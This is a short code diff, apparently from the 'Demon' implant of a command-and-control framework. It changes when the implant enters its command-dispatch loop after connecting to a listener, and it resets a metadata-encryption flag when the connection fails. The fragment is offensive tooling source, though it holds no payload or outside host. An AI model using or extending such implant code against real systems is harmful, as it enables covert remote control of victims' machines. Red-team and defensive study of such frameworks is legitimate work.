@@ -79,10 +79,13 @@ VOID DemonRoutine()
                 /* reset the failure counter since we managed to connect to it. */
                 Instance.Config.Transport.Host->Failures = 0;
 #endif
-
-                /* Enter tasking routine */
-                CommandDispatcher();
             }
+        }
+
+        if ( Instance.Session.Connected )
+        {
+            /* Enter tasking routine */
+            CommandDispatcher();
         }
 
         /* Sleep for a while (with encryption if specified) */
@@ -105,6 +108,7 @@ VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
 
         /* Do not destroy this package if we fail to connect to the listener. */
         ( *MetaData )->Destroy = FALSE;
+        Instance.IsMetadataEncrypted = FALSE;
     }
 
     // create AES Keys/IV
